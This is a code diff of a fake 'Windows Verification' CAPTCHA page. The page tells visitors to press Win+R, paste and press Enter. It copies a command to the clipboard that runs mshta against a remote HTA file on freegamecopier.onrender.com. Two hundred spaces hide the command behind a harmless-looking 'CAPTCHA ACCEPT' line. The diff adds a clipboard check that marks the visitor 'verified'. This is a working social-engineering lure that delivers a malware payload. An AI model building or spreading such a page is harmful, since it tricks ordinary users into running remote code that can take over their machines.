@@ -33,18 +33,17 @@
       cursor: pointer;
       margin: 10px;
     }
-    .btn:hover {
-      background: #4752c4;
-    }
+    .btn:hover { background: #4752c4; }
   </style>
 </head>
 <body>
   <h2>Windows Verification</h2>
   <p>Press <b>Win + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b>:</p>
-
   <div class="cmd" id="cmdText"></div>
   <button class="btn" onclick="copyCommand()">Copy</button>
+  <button class="btn" onclick="checkVerification()">Done</button>
   <button class="btn" onclick="window.location.href='/'">Back to Home</button>
+  <div id="verifyMsg" style="margin-top:10px;"></div>
 
   <script>
     function generateCode() {
@@ -57,8 +56,7 @@
     }
 
     const verificationCode = generateCode();
-    const massiveSpaces = " ".repeat(200); // 👀 Hidden AF
-    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${massiveSpaces}CAPTCHA ACCEPT — Code: ${verificationCode}`;
+    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta?code=${verificationCode}${" ".repeat(200)}CAPTCHA ACCEPT — Code: ${verificationCode}`;
 
     document.getElementById("cmdText").innerText = fullCommand;
 
@@ -66,7 +64,23 @@
       navigator.clipboard.writeText(fullCommand).then(() => {
         alert("Copied to clipboard!");
       }).catch(() => {
-        alert("Clipboard access blocked — try copying manually.");
+        alert("Clipboard access blocked — copy manually.");
+      });
+    }
+
+    function checkVerification() {
+      navigator.clipboard.readText().then(text => {
+        if (text.includes(verificationCode)) {
+          localStorage.setItem("tokenGateVerified", "1");
+          document.getElementById("verifyMsg").style.color = "#4CAF50";
+          document.getElementById("verifyMsg").innerText = "✅ Verified!";
+          setTimeout(() => window.location.href = "/verifynotwindows", 1000);
+        } else {
+          document.getElementById("verifyMsg").style.color = "#ff4d4d";
+          document.getElementById("verifyMsg").innerText = "❌ Verification failed. Clipboard doesn't match.";
+        }
+      }).catch(() => {
+        alert("Failed to read clipboard. Try again.");
       });
     }
   </script>
